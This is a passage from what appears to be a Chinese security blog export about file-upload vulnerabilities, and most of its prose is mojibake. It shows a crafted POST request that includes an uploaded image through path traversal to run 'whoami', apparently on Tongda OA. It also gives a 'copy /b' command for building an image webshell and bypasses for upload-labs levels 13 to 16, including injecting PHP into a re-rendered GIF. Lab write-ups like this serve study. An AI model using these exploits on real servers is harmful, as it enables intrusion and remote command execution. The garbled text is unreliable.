alt="image-20210905165442538"></p><p>ä¸Šä¼ æˆåŠŸï¼›ä¸Šä¼ æˆåŠŸåè®¿é—®æ–‡ä»¶åŒ…å«è·¯å¾„<code>/ispirit/interface/geteway.php</code></p><p>ã€€ã€€burpæŠ“åŒ…æ„é€ æ•°æ®åŒ…ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST /mac/gateway.php HTTP/1.1</span><br><span class="line">Host: 10.10.20.116:88ï¼ˆæ ¹æ®è‡ªå·±çš„IPè€Œå®šï¼‰</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">User-Agent: python-requests/2.21.0</span><br><span class="line">Content-Length: 69</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">json=&#123;&quot;url&quot;:&quot;/general/../../attach/im/2003/941633647.jpg&quot;&#125;&amp;cmd=whoami</span><br></pre></td></tr></table></figure><p>ã€€ã€€å‘é€æŒ‡ä»¤å¯å‘ç°å‘½ä»¤æ‰§è¡ŒæˆåŠŸï¼š</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211114328.png" alt="image-20210905172106015"></p><h5 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnblogs.com/twlr/p/12989951.html#_label0_1</span><br></pre></td></tr></table></figure><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://navisec.it/ç¼–è¾‘å™¨æ¼æ´æ‰‹å†Œ/</span><br><span class="line">https://www.jb51.net/softs/75619.html</span><br><span class="line">https://pan.baidu.com/s/1eLjH_88fhXAw3ZwE7kVRbA æå–ç ï¼šywek</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> å°è¿ªå­¦ä¹ ç¬”è®° </tag>
            
            <tag> æ–‡ä»¶ä¸Šä¼  </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>22WEBæ¼æ´-æ–‡ä»¶ä¸Šä¼ ä¹‹å†…å®¹é€»è¾‘æ•°ç»„ç»•è¿‡</title>
      <link href="/2021/09/21/22WEB%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B9%8B%E5%86%85%E5%AE%B9%E9%80%BB%E8%BE%91%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87/"/>
      <url>/2021/09/21/22WEB%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B9%8B%E5%86%85%E5%AE%B9%E9%80%BB%E8%BE%91%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<p>ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†</p><span id="more"></span><h3 id="å›¾ç‰‡ä¸€å¥è¯åˆ¶ä½œæ–¹æ³•ï¼š"><a href="#å›¾ç‰‡ä¸€å¥è¯åˆ¶ä½œæ–¹æ³•ï¼š" class="headerlink" title="å›¾ç‰‡ä¸€å¥è¯åˆ¶ä½œæ–¹æ³•ï¼š"></a>å›¾ç‰‡ä¸€å¥è¯åˆ¶ä½œæ–¹æ³•ï¼š</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy 1.png /b + shell.php /a webshell.jpg </span><br></pre></td></tr></table></figure><h3 id="å›¾ç‰‡é©¬"><a href="#å›¾ç‰‡é©¬" class="headerlink" title="å›¾ç‰‡é©¬"></a>å›¾ç‰‡é©¬</h3><h4 id="æ–‡ä»¶å¤´æ£€æµ‹"><a href="#æ–‡ä»¶å¤´æ£€æµ‹" class="headerlink" title="æ–‡ä»¶å¤´æ£€æµ‹"></a>æ–‡ä»¶å¤´æ£€æµ‹</h4><p>å›¾ç‰‡é©¬éœ€è¦åˆ©ç”¨æ–‡ä»¶åŒ…å«æ¥æ‰§è¡Œä¸€å¥è¯ï¼Œå•çº¯çš„ä¸Šä¼ å›¾ç‰‡é©¬æ˜¯ä¸å¯ä»¥æ‰§è¡Œçš„ï¼Œå’Œæ­£å¸¸å›¾ç‰‡æ²¡ä»€ä¹ˆåŒºåˆ«</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/upload-labs/Pass-13/index.php</span><br></pre></td></tr></table></figure><p><strong>æ£€æµ‹å‡½æ•°</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">function getReailFileType($filename)&#123;</span><br><span class="line">    $file = fopen($filename, &quot;rb&quot;);</span><br><span class="line">    $bin = fread($file, 2); //åªè¯»2å­—èŠ‚ï¼Œè·å–æ–‡ä»¶ç±»å‹</span><br><span class="line">    fclose($file);</span><br><span class="line">    $strInfo = @unpack(&quot;C2chars&quot;, $bin);    </span><br><span class="line">    $typeCode = intval($strInfo[&#x27;chars1&#x27;].$strInfo[&#x27;chars2&#x27;]);    </span><br><span class="line">    $fileType = &#x27;&#x27;;    </span><br><span class="line">    switch($typeCode)&#123;      </span><br><span class="line">        case 255216:            </span><br><span class="line">            $fileType = &#x27;jpg&#x27;;</span><br><span class="line">            break;</span><br><span class="line">        case 13780:            </span><br><span class="line">            $fileType = &#x27;png&#x27;;</span><br><span class="line">            break;        </span><br><span class="line">        case 7173:            </span><br><span class="line">            $fileType = &#x27;gif&#x27;;</span><br><span class="line">            break;</span><br><span class="line">        default:            </span><br><span class="line">            $fileType = &#x27;unknown&#x27;;</span><br><span class="line">        &#125;    </span><br><span class="line">        return $fileType;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if(isset($_POST[&#x27;submit&#x27;]))&#123;</span><br><span class="line">    $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">    $file_type = getReailFileType($temp_file);</span><br><span class="line"></span><br><span class="line">    if($file_type == &#x27;unknown&#x27;)&#123;</span><br><span class="line">        $msg = &quot;æ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $img_path = $UPLOAD_ADDR.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_type;//å°†å‰é¢åˆ¤æ–­çš„æ–‡ä»¶ç±»å‹æ‹¼æ¥</span><br><span class="line">        if(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = true;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            $msg = &quot;ä¸Šä¼ å¤±è´¥&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ç»•è¿‡</strong></p><p>è¿™é‡Œåªéœ€è¦ä¼ªé€ ä¸€ä¸ªæ–‡ä»¶å¤´æ˜¯å›¾ç‰‡æ ¼å¼å°±å¯ä»¥ç»•è¿‡ï¼Œä½†æ˜¯æœ€åæ‹¼æ¥çš„æ—¶å€™æ˜¯æ ¹æ®åˆ¤æ–­æ‹¼æ¥çš„ï¼Œæ‰€ä»¥è¿˜æ˜¯éœ€è¦é…åˆæ–‡ä»¶åŒ…å«æ‰å¯ä»¥æ‰§è¡Œshellã€‚å½“ç„¶è¿™é‡Œä¸Šä¼ å›¾ç‰‡é©¬ä¹Ÿå¯ä»¥ã€‚</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211112683.png" alt="image-20210904155945718"></p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211112618.png" alt="image-20210904160009391" style="zoom:67%;" /><h4 id="getimagesizeå‡½æ•°ç»•è¿‡"><a href="#getimagesizeå‡½æ•°ç»•è¿‡" class="headerlink" title="getimagesizeå‡½æ•°ç»•è¿‡"></a>getimagesizeå‡½æ•°ç»•è¿‡</h4><p>getimagesize() å‡½æ•°å°†æµ‹å®šä»»ä½• GIFï¼ŒJPGï¼ŒPNGï¼ŒSWFï¼ŒSWCï¼ŒPSDï¼ŒTIFFï¼ŒBMPï¼ŒIFFï¼ŒJP2ï¼ŒJPXï¼ŒJB2ï¼ŒJPCï¼ŒXBM æˆ– WBMP å›¾åƒæ–‡ä»¶çš„å¤§å°å¹¶è¿”å›å›¾åƒçš„å°ºå¯¸ä»¥åŠæ–‡ä»¶ç±»å‹åŠå›¾ç‰‡é«˜åº¦ä¸å®½åº¦ã€‚å‡½æ•°æˆåŠŸè¿”å›çš„å°±æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œå¤±è´¥åˆ™è¿”å› FALSE å¹¶äº§ç”Ÿä¸€æ¡ E_WARNING çº§çš„é”™è¯¯ä¿¡æ¯ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/upload-labs/Pass-14/index.php</span><br></pre></td></tr></table></figure><p><strong>æ£€æµ‹ä»£ç </strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">function isImage($filename)&#123;</span><br><span class="line">    $types = &#x27;.jpeg|.png|.gif&#x27;;</span><br><span class="line">    if(file_exists($filename))&#123;</span><br><span class="line">        $info = getimagesize($filename);</span><br><span class="line">        $ext = image_type_to_extension($info[2]);</span><br><span class="line">        if(stripos($types,$ext))&#123;</span><br><span class="line">            return $ext;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if(isset($_POST[&#x27;submit&#x27;]))&#123;</span><br><span class="line">    $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">    $res = isImage($temp_file);</span><br><span class="line">    if(!$res)&#123;</span><br><span class="line">        $msg = &quot;æ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $img_path = $UPLOAD_ADDR.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).$res;</span><br><span class="line">        if(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = true;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            $msg = &quot;ä¸Šä¼ å¤±è´¥&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="ç»•è¿‡æ–¹æ³•"><a href="#ç»•è¿‡æ–¹æ³•" class="headerlink" title="ç»•è¿‡æ–¹æ³•"></a>ç»•è¿‡æ–¹æ³•</h4><p>è¯¥å‡½æ•°ä¼šè¿”å›å›¾ç‰‡çš„ä¿¡æ¯ï¼Œæ‰€æœ‰å¦‚æœä¸ä¸Šä¼ å›¾ç‰‡é©¬æ˜¯ç»•ä¸è¿‡å»çš„ã€‚</p><p><strong>ç»•è¿‡</strong></p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211112860.png" alt="image-20210904163347922" /><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211112179.png" alt="image-20210904163405278"></p><h3 id="exif-imagetypeå‡½æ•°ç»•è¿‡"><a href="#exif-imagetypeå‡½æ•°ç»•è¿‡" class="headerlink" title="exif_imagetypeå‡½æ•°ç»•è¿‡"></a>exif_imagetypeå‡½æ•°ç»•è¿‡</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/upload-labs/Pass-15/index.php</span><br></pre></td></tr></table></figure><p><strong>æ£€æµ‹ä»£ç </strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">function isImage($filename)&#123;</span><br><span class="line">    //éœ€è¦å¼€å¯php_exifæ¨¡å—</span><br><span class="line">    $image_type = exif_imagetype($filename);</span><br><span class="line">    switch ($image_type) &#123;</span><br><span class="line">        case IMAGETYPE_GIF:</span><br><span class="line">            return &quot;gif&quot;;</span><br><span class="line">            break;</span><br><span class="line">        case IMAGETYPE_JPEG:</span><br><span class="line">            return &quot;jpg&quot;;</span><br><span class="line">            break;</span><br><span class="line">        case IMAGETYPE_PNG:</span><br><span class="line">            return &quot;png&quot;;</span><br><span class="line">            break;    </span><br><span class="line">        default:</span><br><span class="line">            return false;</span><br><span class="line">            break;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if(isset($_POST[&#x27;submit&#x27;]))&#123;</span><br><span class="line">    $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">    $res = isImage($temp_file);</span><br><span class="line">    if(!$res)&#123;</span><br><span class="line">        $msg = &quot;æ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $img_path = $UPLOAD_ADDR.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$res;</span><br><span class="line">        if(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = true;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            $msg = &quot;ä¸Šä¼ å¤±è´¥&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>exif_imagetype â€” åˆ¤æ–­ä¸€ä¸ªå›¾åƒçš„ç±»å‹å¹¶ä¸”ä¼šåˆ¤æ–­ä»–çš„ç­¾å</p><h4 id="ç»•è¿‡æ–¹æ³•-1"><a href="#ç»•è¿‡æ–¹æ³•-1" class="headerlink" title="ç»•è¿‡æ–¹æ³•"></a>ç»•è¿‡æ–¹æ³•</h4><p>é€šè¿‡ä¸Šä¼ å›¾ç‰‡é©¬ç»•è¿‡</p><h3 id="äºŒæ¬¡æ¸²æŸ“"><a href="#äºŒæ¬¡æ¸²æŸ“" class="headerlink" title="äºŒæ¬¡æ¸²æŸ“"></a>äºŒæ¬¡æ¸²æŸ“</h3><p>åŸç†ï¼šå°†ä¸€ä¸ªæ­£å¸¸æ˜¾ç¤ºçš„å›¾ç‰‡ï¼Œä¸Šä¼ åˆ°æœåŠ¡å™¨ã€‚å¯»æ‰¾å›¾ç‰‡è¢«æ¸²æŸ“åä¸åŸå§‹å›¾ç‰‡éƒ¨åˆ†å¯¹æ¯”ä»ç„¶ç›¸åŒçš„æ•°æ®å—éƒ¨åˆ†ï¼Œå°†Webshellä»£ç æ’åœ¨è¯¥éƒ¨åˆ†ï¼Œç„¶åä¸Šä¼ ã€‚å…·ä½“å®ç°éœ€è¦è‡ªå·±ç¼–å†™Pythonç¨‹åºï¼Œäººå·¥å°è¯•åŸºæœ¬æ˜¯ä¸å¯èƒ½æ„é€ å‡ºèƒ½ç»•è¿‡æ¸²æŸ“å‡½æ•°çš„å›¾ç‰‡webshellçš„ã€‚</p><h4 id="æ£€æµ‹ä»£ç "><a href="#æ£€æµ‹ä»£ç " class="headerlink" title="æ£€æµ‹ä»£ç "></a>æ£€æµ‹ä»£ç </h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&#x27;submit&#x27;]))&#123;</span><br><span class="line">    // è·å¾—ä¸Šä¼ æ–‡ä»¶çš„åŸºæœ¬ä¿¡æ¯ï¼Œæ–‡ä»¶åï¼Œç±»å‹ï¼Œå¤§å°ï¼Œä¸´æ—¶æ–‡ä»¶è·¯å¾„</span><br><span class="line">    $filename = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;];</span><br><span class="line">    $filetype = $_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;];</span><br><span class="line">    $tmpname = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line"></span><br><span class="line">    $target_path=$UPLOAD_ADDR.basename($filename);</span><br><span class="line"></span><br><span class="line">    // è·å¾—ä¸Šä¼ æ–‡ä»¶çš„æ‰©å±•å</span><br><span class="line">    $fileext= substr(strrchr($filename,&quot;.&quot;),1);</span><br><span class="line"></span><br><span class="line">    //åˆ¤æ–­æ–‡ä»¶åç¼€ä¸ç±»å‹ï¼Œåˆæ³•æ‰è¿›è¡Œä¸Šä¼ æ“ä½œ</span><br><span class="line">    if(($fileext == &quot;jpg&quot;) &amp;&amp; ($filetype==&quot;image/jpeg&quot;))&#123;</span><br><span class="line">        if(move_uploaded_file($tmpname,$target_path))</span><br><span class="line">        &#123;</span><br><span class="line">            //ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡</span><br><span class="line">            $im = imagecreatefromjpeg($target_path);</span><br><span class="line"></span><br><span class="line">            if($im == false)&#123;</span><br><span class="line">                $msg = &quot;è¯¥æ–‡ä»¶ä¸æ˜¯jpgæ ¼å¼çš„å›¾ç‰‡ï¼&quot;;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                //ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å</span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).&quot;.jpg&quot;;</span><br><span class="line">                $newimagepath = $UPLOAD_ADDR.$newfilename;</span><br><span class="line">                imagejpeg($im,$newimagepath);</span><br><span class="line">                //æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰</span><br><span class="line">                $img_path = $UPLOAD_ADDR.$newfilename;</span><br><span class="line">                unlink($target_path);</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            $msg = &quot;ä¸Šä¼ å¤±è´¥ï¼&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;else if(($fileext == &quot;png&quot;) &amp;&amp; ($filetype==&quot;image/png&quot;))&#123;</span><br><span class="line">        if(move_uploaded_file($tmpname,$target_path))</span><br><span class="line">        &#123;</span><br><span class="line">            //ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡</span><br><span class="line">            $im = imagecreatefrompng($target_path);</span><br><span class="line"></span><br><span class="line">            if($im == false)&#123;</span><br><span class="line">                $msg = &quot;è¯¥æ–‡ä»¶ä¸æ˜¯pngæ ¼å¼çš„å›¾ç‰‡ï¼&quot;;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                 //ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å</span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).&quot;.png&quot;;</span><br><span class="line">                $newimagepath = $UPLOAD_ADDR.$newfilename;</span><br><span class="line">                imagepng($im,$newimagepath);</span><br><span class="line">                //æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰</span><br><span class="line">                $img_path = $UPLOAD_ADDR.$newfilename;</span><br><span class="line">                unlink($target_path);</span><br><span class="line">                $is_upload = true;               </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            $msg = &quot;ä¸Šä¼ å¤±è´¥ï¼&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;else if(($fileext == &quot;gif&quot;) &amp;&amp; ($filetype==&quot;image/gif&quot;))&#123;</span><br><span class="line">        if(move_uploaded_file($tmpname,$target_path))</span><br><span class="line">        &#123;</span><br><span class="line">            //ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡</span><br><span class="line">            $im = imagecreatefromgif($target_path);</span><br><span class="line">            if($im == false)&#123;</span><br><span class="line">                $msg = &quot;è¯¥æ–‡ä»¶ä¸æ˜¯gifæ ¼å¼çš„å›¾ç‰‡ï¼&quot;;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                //ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å</span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).&quot;.gif&quot;;</span><br><span class="line">                $newimagepath = $UPLOAD_ADDR.$newfilename;</span><br><span class="line">                imagegif($im,$newimagepath);</span><br><span class="line">                //æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰</span><br><span class="line">                $img_path = $UPLOAD_ADDR.$newfilename;</span><br><span class="line">                unlink($target_path);</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            $msg = &quot;ä¸Šä¼ å¤±è´¥ï¼&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $msg = &quot;åªå…è®¸ä¸Šä¼ åç¼€ä¸º.jpg|.png|.gifçš„å›¾ç‰‡æ–‡ä»¶ï¼&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="ä¸Šä¼ gif"><a href="#ä¸Šä¼ gif" class="headerlink" title="ä¸Šä¼ gif"></a>ä¸Šä¼ gif</h4><p>å°†<code>&lt;?php phpinfo(); ?&gt;</code>æ·»åŠ åˆ°111.gifçš„å°¾éƒ¨.</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211112272.png" alt="image-20210904165301773"></p><p>æˆåŠŸä¸Šä¼ å«æœ‰ä¸€å¥è¯çš„111.gif,ä½†æ˜¯è¿™å¹¶æ²¡æœ‰æˆåŠŸ.æˆ‘ä»¬å°†ä¸Šä¼ çš„å›¾ç‰‡ä¸‹è½½åˆ°æœ¬åœ°.<br><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211113128.png" alt="image-20210904165313563"></p><p>å¯ä»¥çœ‹åˆ°ä¸‹è½½ä¸‹æ¥çš„æ–‡ä»¶åå·²ç»å˜åŒ–,æ‰€ä»¥è¿™æ˜¯ç»è¿‡äºŒæ¬¡æ¸²æŸ“çš„å›¾ç‰‡.æˆ‘ä»¬ä½¿ç”¨16è¿›åˆ¶ç¼–è¾‘å™¨å°†å…¶æ‰“å¼€.<br><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211112707.png" alt="image-20210904165322486"></p><p>å¯ä»¥å‘ç°,æˆ‘ä»¬åœ¨gifæœ«ç«¯æ·»åŠ çš„phpä»£ç å·²ç»è¢«å»é™¤.</p><p>å…³äºç»•è¿‡gifçš„äºŒæ¬¡æ¸²æŸ“,æˆ‘ä»¬åªéœ€è¦æ‰¾åˆ°æ¸²æŸ“å‰åæ²¡æœ‰å˜åŒ–çš„ä½ç½®,ç„¶åå°†phpä»£ç å†™è¿›å»,å°±å¯ä»¥æˆåŠŸä¸Šä¼ å¸¦æœ‰phpä»£ç çš„å›¾ç‰‡äº†.</p><p>ç»è¿‡å¯¹æ¯”,è“è‰²éƒ¨åˆ†æ˜¯æ²¡æœ‰å‘ç”Ÿå˜åŒ–çš„,<br><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211112714.png" alt="image-20210904165333714"></p><p>æˆ‘ä»¬å°†ä»£ç å†™åˆ°è¯¥ä½ç½®.<br><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211113040.png" alt="image-20210904165342772"></p><p>ä¸Šä¼ 